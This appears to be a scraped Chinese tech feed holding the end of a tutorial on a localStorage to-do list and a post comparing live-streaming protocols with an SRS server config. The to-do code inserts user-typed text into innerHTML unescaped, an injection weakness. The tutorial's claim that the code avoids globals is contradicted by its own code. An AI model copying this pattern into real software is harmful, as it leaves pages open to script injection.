  <span class="hljs-attribute">outline</span>: <span class="hljs-number">3px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0.8</span>); <span class="hljs-comment">/* 聚焦高亮 */</span>
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"submit"</span>]</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">0.8</span>);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"submit"</span>]</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">211</span>, <span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-10">3. 核心文件：index.html</h3>
<p>html</p>
<p>预览</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>LocalStorage 待办清单<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./common.css"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"wrapper"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>LOCAL TAPAS<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"plates"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Loading Tapas...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"add-items"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
        <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> 
        <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入待办事项"</span> 
        <span class="hljs-attr">required</span>
        <span class="hljs-attr">name</span>=<span class="hljs-string">"item"</span>
      &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"+ 添加事项"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// 1. 获取 DOM 元素</span>
    <span class="hljs-keyword">const</span> addItemsForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.add-items'</span>);
    <span class="hljs-keyword">const</span> itemsList = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.plates'</span>);
    <span class="hljs-comment">// 2. 从 LocalStorage 取数据（无则初始化空数组）</span>
    <span class="hljs-keyword">const</span> items = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'todos'</span>)) || [];

    <span class="hljs-comment">/**
     * 渲染待办列表
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} <span class="hljs-variable">plates</span> - 待办数组
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Element</span>} <span class="hljs-variable">platesList</span> - 列表 DOM 元素
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">populateList</span>(<span class="hljs-params">plates = [], platesList</span>) {
      <span class="hljs-comment">// 数组 map 生成 DOM 字符串，join 拼接（避免逗号分隔）</span>
      platesList.<span class="hljs-property">innerHTML</span> = plates.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">plate, index</span>) =&gt;</span> <span class="hljs-string">`
        &lt;li&gt;
          &lt;input 
            type="checkbox" 
            data-index="<span class="hljs-subst">${index}</span>" 
            id="item<span class="hljs-subst">${index}</span>"
            <span class="hljs-subst">${plate.done ? <span class="hljs-string">'checked'</span> : <span class="hljs-string">''</span>}</span>
          /&gt;
          &lt;label for="item<span class="hljs-subst">${index}</span>"&gt;<span class="hljs-subst">${plate.text}</span>&lt;/label&gt;
        &lt;/li&gt;
      `</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
    }

    <span class="hljs-comment">/**
     * 添加待办事项
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Event</span>} <span class="hljs-variable">event</span> - 表单提交事件
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addItem</span>(<span class="hljs-params">event</span>) {
      event.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// 阻止表单默认提交行为</span>
      <span class="hljs-comment">// 获取输入框值（去空格）</span>
      <span class="hljs-keyword">const</span> text = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'[name=item]'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
      <span class="hljs-keyword">if</span> (!text) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 空值不添加</span>

      <span class="hljs-comment">// 新增待办对象</span>
      <span class="hljs-keyword">const</span> newItem = {
        text,
        <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 默认未完成</span>
      };

      items.<span class="hljs-title function_">push</span>(newItem);
      <span class="hljs-comment">// 存入 LocalStorage（序列化数组）</span>
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'todos'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(items));
      <span class="hljs-comment">// 重新渲染列表</span>
      <span class="hljs-title function_">populateList</span>(items, itemsList);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>(); <span class="hljs-comment">// 重置表单</span>
    }

    <span class="hljs-comment">/**
     * 切换待办完成状态
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Event</span>} <span class="hljs-variable">event</span> - 点击事件
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">toggleDone</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>;
      <span class="hljs-comment">// 只处理复选框的点击</span>
      <span class="hljs-keyword">if</span> (target.<span class="hljs-property">tagName</span> !== <span class="hljs-string">'INPUT'</span>) <span class="hljs-keyword">return</span>;

      <span class="hljs-comment">// 获取数据索引（从 data-index 属性）</span>
      <span class="hljs-keyword">const</span> index = target.<span class="hljs-property">dataset</span>.<span class="hljs-property">index</span>;
      <span class="hljs-comment">// 切换完成状态</span>
      items[index].<span class="hljs-property">done</span> = !items[index].<span class="hljs-property">done</span>;
      <span class="hljs-comment">// 更新 LocalStorage</span>
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'todos'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(items));
      <span class="hljs-comment">// 重新渲染</span>
      <span class="hljs-title function_">populateList</span>(items, itemsList);
    }

    <span class="hljs-comment">// 3. 绑定事件监听</span>
    addItemsForm.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, addItem);
    itemsList.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, toggleDone);

    <span class="hljs-comment">// 4. 页面加载时渲染列表</span>
    <span class="hljs-title function_">populateList</span>(items, itemsList);
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-11">三、关键技术拆解：为什么这么写？</h2>
<h3 data-id="heading-12">1. LocalStorage 持久化逻辑</h3>
<ul>
<li><strong>初始化</strong>：页面加载时从 <code>localStorage</code> 读取 <code>todos</code> 数据，若不存在则初始化为空数组</li>
<li><strong>新增待办</strong>：添加后立即用 <code>JSON.stringify()</code> 序列化数组，存入 <code>localStorage</code></li>
<li><strong>状态切换</strong>：修改待办完成状态后，同步更新 <code>localStorage</code>，确保刷新后状态不丢失</li>
</ul>
<h3 data-id="heading-13">2. CSS 进阶技巧</h3>
<ul>
<li><strong>盒模型继承</strong>：通过 <code>box-sizing: inherit</code> 让所有元素（包括伪元素）继承 <code>border-box</code>，避免计算宽度时的麻烦</li>
<li><strong>Flex 布局妙用</strong>：页面整体居中、待办项复选框与文本对齐、表单输入框与按钮同行分布，都用 Flex 实现，简洁高效</li>
<li><strong>自定义复选框</strong>：隐藏原生复选框，用 <code>:before</code> 伪元素实现自定义图标，提升视觉体验</li>
<li><strong>聚焦状态优化</strong>：输入框聚焦时添加蓝色轮廓，提升交互反馈</li>
</ul>
<h3 data-id="heading-14">3. 工程化编码思想</h3>
<h4 data-id="heading-15">（1）函数式封装：拒绝流程式代码</h4>
<ul>
<li>把「渲染列表」「添加待办」「切换状态」拆分为 3 个独立函数，每个函数只做一件事</li>
<li>函数参数化：<code>populateList</code> 接收待办数组和列表 DOM 元素，增强复用性</li>
<li>避免全局变量污染：核心数据 <code>items</code> 通过函数参数传递，而非依赖全局变量</li>
</ul>
<h4 data-id="heading-16">（2）细节优化：提升用户体验</h4>
<ul>
<li>输入框去空格：用 <code>trim()</code> 避免添加空待办</li>
<li>空值判断：输入为空时不添加待办</li>
<li>表单重置：添加后清空输入框，方便连续输入</li>
<li>事件委托：给列表父元素绑定点击事件，而非给每个复选框绑定，提升性能（尤其待办较多时）</li>
</ul>
<h2 data-id="heading-17">四、扩展与优化方向</h2>
<ol>
<li><strong>添加删除功能</strong>：给每个待办项增加删除按钮，点击时删除对应项并更新 <code>localStorage</code></li>
<li><strong>批量操作</strong>：实现「全选 / 全不选」「清空已完成」功能</li>
<li><strong>数据持久化优化</strong>：封装 <code>localStorage</code> 操作工具函数，避免重复写 <code>JSON.stringify</code> 和 <code>JSON.parse</code></li>
<li><strong>样式升级</strong>：添加动画效果（如待办项添加 / 删除时的过渡动画）</li>
<li><strong>响应式优化</strong>：适配移动端，优化小屏幕下的布局</li>
</ol>
<h2 data-id="heading-18">五、总结</h2>
<p>本文通过一个简单的待办清单案例，串联了 LocalStorage 本地存储、CSS 进阶特性和前端工程化编码思想。核心要点：</p>
<ul>
<li>LocalStorage 是前端持久化存储的基础，关键是掌握「序列化 / 反序列化」技巧</li>
<li>CSS 不仅是样式，合理运用继承、Flex 布局和伪元素，能大幅提升开发效率和视觉体验</li>
<li>工程化编码的核心是「拆分与封装」，让代码更易维护、可复用</li>
</ul>
<p>这个案例虽然简单，但包含了前端开发的核心思想，适合新手入门练习，也能帮助有经验的开发者巩固基础。动手试试扩展功能，让它变得更强大吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谈谈最进学习（低延迟）直播项目的坎坷与收获]]></title>    <link>https://juejin.cn/post/7575152891955314688</link>    <guid>https://juejin.cn/post/7575152891955314688</guid>    <pubDate>2025-11-23T02:51:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955314688" data-draft-id="7575152891955298304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谈谈最进学习（低延迟）直播项目的坎坷与收获"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T02:51:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小熊哥722"/> <meta itemprop="url" content="https://juejin.cn/user/758013551998826"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谈谈最进学习（低延迟）直播项目的坎坷与收获
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/758013551998826/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小熊哥722
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:51:03.000Z" title="Sun Nov 23 2025 02:51:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近一直在学习低延迟直播系统的开发，从协议选型到具体实现，踩过不少坑，也积累了很多经验。分享一下这段旅程中的思考和收获～</p>
<h2 data-id="heading-0">一、直播核心协议选型：从认知到决策</h2>
<p>开发的第一步，是理清主流直播协议的特性，找到适配场景的技术方向。以下是我对核心协议的整理与分析：</p>
<h3 data-id="heading-1">1. HTTP-FLV：兼容性之王</h3>
<p><strong>核心特点</strong>：基于 HTTP 分块编码传输 FLV 容器格式，轻量化、易部署。</p>
<ul>
<li>
<p><strong>封装与传输</strong>：FLV 仅支持 H.264/H.265（视频）、AAC/MP3（音频），封装简单（头部 + 音视频 Tag），解码延迟低；借助 HTTP 分块编码实现 “边传边播”，默认 80/443 端口可穿透防火墙。</p>
</li>
<li>
<p><strong>传输流程</strong>：</p>
<ol>
<li>播放端发送<code>GET /live/stream.flv</code>请求，携带<code>Accept: */*</code>；</li>
<li>服务端响应<code>Transfer-Encoding: chunked</code>，按 1-8KB 拆分 FLV 流并实时推送。</li>
</ol>
</li>
<li>
<p><strong>延迟构成</strong>：</p>
<ul>
<li>编码延迟（50ms-300ms）：依赖推流端低延迟配置（无 B 帧、短 GOP）；</li>
<li>服务端延迟（300ms-2s）：GOP 缓存 / 转码是主因（优化后可压至 300ms 内）；</li>
<li>传输 + 播放端延迟（400ms-1.9s）：HTTP 封装开销 + 播放器缓冲（优化后可至 0.3-1s）。</li>
</ul>
</li>
<li>
<p><strong>优缺点</strong>：✅ 兼容性极强（浏览器 / APP / 机顶盒）、配置简单、支持 HTTPS；❌ 协议开销略高、依赖 GOP 缓存、Web 端需 FLV.js 解析。</p>
</li>
</ul>
<h3 data-id="heading-2">2. RTMP：低延迟直播老将</h3>
<p><strong>核心特点</strong>：基于 TCP 的实时消息传输协议，专为音视频设计。</p>
<ul>
<li><strong>传输机制</strong>：分层结构（应用层 / 消息层 / 协议层），Chunk 分块传输大帧，滑动窗口控流。</li>
<li><strong>延迟优势</strong>：优化后全链路延迟 0.8-2s，比 HTTP-FLV 低 20%-30%，服务端无转码时延迟可忽略。</li>
<li><strong>优缺点</strong>：✅ 延迟低、配置直接、兼容性广；❌ 弱网 TCP 重传易卡顿、无默认加密、Web 端需 Flash 替代方案。</li>
</ul>
<h3 data-id="heading-3">3. HLS/LL-HLS：跨平台兼容首选</h3>
<p><strong>核心特点</strong>：切片传输 + 自适应码率，原生支持全平台。</p>
<ul>
<li><strong>原生痛点</strong>：切片机制导致延迟 10-30s（切片生成 + 缓存 + 播放缓冲）；</li>
<li><strong>LL-HLS 优化</strong>：缩短切片至 0.5-2s、分片传输 Chunk、实时更新 m3u8，延迟降至 3-5s。</li>
<li><strong>优缺点</strong>：✅ 极致兼容、自适应码率、易部署；❌ 原生延迟高、切片开销大、实时性差。</li>
</ul>
<h3 data-id="heading-4">4. WebRTC：实时互动利器</h3>
<p><strong>核心特点</strong>：浏览器原生实时通信，毫秒级延迟（50-300ms）。</p>
<ul>
<li><strong>技术栈</strong>：集成采集 / 编码 / 传输 / 渲染，UDP 传输 + P2P 直连，内置回声消除等互动功能。</li>
<li><strong>延迟构成</strong>：采集编码（30-80ms）+ 传输（20-150ms）+ 解码渲染（10-30ms）。</li>
<li><strong>优缺点</strong>：✅ 延迟最低、互动性强、无插件依赖；❌ 部署复杂（需 STUN/TURN/SFU）、带宽占用高。</li>
</ul>
<h3 data-id="heading-5">5. SRT：专业级低延迟传输</h3>
<p><strong>核心特点</strong>：UDP 可靠传输 + 加密，延迟 10-150ms，抗丢包（10% 丢包仍稳定）。</p>
<ul>
<li><strong>技术优势</strong>：ARQ 重传 + FEC 纠错，原生 AES 加密，适配 4K/8K 高码率传输。</li>
<li><strong>优缺点</strong>：✅ 延迟极低、可靠性强、加密安全；❌ Web 端兼容性差、CDN 支持有限、配置精细。</li>
</ul>
<h3 data-id="heading-6">协议特性对比表</h3>






















































<table><thead><tr><th>特性</th><th>SRT</th><th>WebRTC</th><th>HTTP-FLV（优化后）</th><th>RTMP（优化后）</th></tr></thead><tbody><tr><td>原生延迟</td><td>10-150ms</td><td>50-300ms</td><td>1-2.5s</td><td>0.8-2s</td></tr><tr><td>传输协议</td><td>UDP（可靠传输）</td><td>UDP（为主）</td><td>TCP（HTTP/HTTP3）</td><td>TCP</td></tr><tr><td>丢包容忍性</td><td>强（10% 丢包）</td><td>中（5% 丢包）</td><td>强（TCP 重传）</td><td>中（TCP 重传阻塞）</td></tr><tr><td>加密支持</td><td>原生 AES</td><td>需 DTLS</td><td>依赖 HTTPS</td><td>需 RTMPS</td></tr><tr><td>高并发支持</td><td>中（需媒体服务器）</td><td>低（P2P 带宽受限）</td><td>高（CDN 分发）</td><td>中（CDN 支持）</td></tr><tr><td>部署复杂度</td><td>中</td><td>高</td><td>低</td><td>中</td></tr></tbody></table>
<h2 data-id="heading-7">二、开发实践：从选型到落地的坎坷</h2>
<h3 data-id="heading-8">1. 初期选型：WebRTC 的尝试与碰壁</h3>
<p>最开始选择 WebRTC 作为核心协议（一是初期对 SRT 认知不足，二是看中其浏览器原生兼容性）：</p>
<ul>
<li>手动封装信令服务器 + WebRTC 推拉流组件，实现基础功能后发现<strong>并发极低</strong>；</li>
<li>转向 MediaSoup（SFU 框架）优化并发，但全英文文档 + 拓展复杂度高，最终放弃。</li>
</ul>
<p>这段经历虽未落地，但吃透了 WebRTC 的信令交互、NAT 穿透、媒体流处理逻辑。</p>
<h3 data-id="heading-9">2. 最终选型：SRS 的救赎</h3>
<p>SRS（Simple Real-Time Server）是开源实时视频服务器，支持多协议转换，成为我的最终选择：</p>
<ul>
<li>支持 RTMP/WebRTC/HTTP-FLV/SRT 等协议，开箱即用；</li>
<li>解决了 WebRTC 并发问题，且支持协议转换（如 RTMP 转 WebRTC）。</li>
</ul>
<h4 data-id="heading-10">SRS 配置（6.0 版本）</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># main config for srs.</span>
listen              1935<span class="hljs-comment">;          # RTMP端口</span>
max_connections     1000<span class="hljs-comment">;          # 最大连接数</span>
daemon              on<span class="hljs-comment">;            # 守护进程模式</span>

<span class="hljs-comment"># HTTP API：用于控制和查询SRS状态</span>
http_api {
    enabled         on<span class="hljs-comment">;</span>
    listen          1985<span class="hljs-comment">;</span>
}

<span class="hljs-comment"># HTTP服务器：提供HLS/HTTP-FLV访问</span>
http_server {
    enabled         on<span class="hljs-comment">;</span>
    listen          8080<span class="hljs-comment">;</span>
    dir             ./objs/nginx/html<span class="hljs-comment">; # 静态文件目录</span>
}

<span class="hljs-comment"># WebRTC配置：UDP端口+公网候选地址</span>
rtc_server {
    enabled on<span class="hljs-comment">;</span>
    listen  8000<span class="hljs-comment">; # WebRTC的UDP端口</span>
    candidate 0.0.0.0<span class="hljs-comment">; # 公网服务器需替换为实际IP</span>
}

vhost __defaultVhost__ {
    <span class="hljs-comment"># HLS配置：低延迟切片</span>
    hls {
        enabled         on<span class="hljs-comment">;</span>
        hls_path        ./objs/nginx/html/hls<span class="hljs-comment">;</span>
        hls_m3u8_file   <span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>.m3u8<span class="hljs-comment">;</span>
        hls_ts_file     <span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>-<span class="hljs-section">[seq]</span>.ts<span class="hljs-comment">;</span>
        hls_fragment    1<span class="hljs-comment">; # 1秒切片，降低延迟</span>
    }

    <span class="hljs-comment"># HTTP-FLV挂载</span>
    http_remux {
        enabled     on<span class="hljs-comment">;</span>
        mount       <span class="hljs-section">[vhost]</span>/<span class="hljs-section">[app]</span>/<span class="hljs-section">[stream]</span>.flv<span class="hljs-comment">;</span>
    }

    <span class="hljs-comment"># WebRTC与RTMP互转</span>
    rtc {
        enabled     on<span class="hljs-comment">;</span>
        rtmp_to_rtc on<span class="hljs-comment">; # RTMP推流转WebRTC播放</span>
        rtc_to_rtmp on<span class="hljs-comment">; # WebRTC推流转RTMP播放</span>
    }

    <span class="hljs-comment"># 播放优化：GOP缓存+队列控制</span>
    play {
        gop_cache_max_frames 2500<span class="hljs-comment">;</span>
        gop_cache on<span class="hljs-comment">; # 缓存GOP实现秒开</span>
        queue_length 10<span class="hljs-comment">; # 播放队列长度（缓存10帧）</span>
    }
}
</code></pre>
<h4 data-id="heading-11">踩坑与解决</h4>
<ul>
<li>AI 提供的配置常出现语法错误（如路径格式、参数冲突），需结合官方文档逐行校验；</li>
<li>WebRTC 推流需确保<code>candidate</code>配置正确（公网 IP / 端口映射），否则无法建立连接；</li>
<li>低延迟优化需关闭 GOP 缓存、缩短 HLS 切片、减小播放器缓冲。</li>
</ul>
<h2 data-id="heading-12">三、收获与总结</h2>
<ol>
<li>
<p><strong>协议选型无优劣，适配场景是关键</strong>：
互动场景选 WebRTC，低延迟直播选 SRT/RTMP，跨平台兼容选 LL-HLS；</p>
</li>
<li>
<p><strong>开源工具的力量</strong>：SRS 这类成熟框架节省了底层开发成本，聚焦业务逻辑即可快速落地；</p>
</li>
<li>
<p><strong>实践出真知</strong>：从手动封装组件到踩坑 SRS 配置，每一步试错都加深了对直播技术栈的理解。</p>
</li>
</ol>
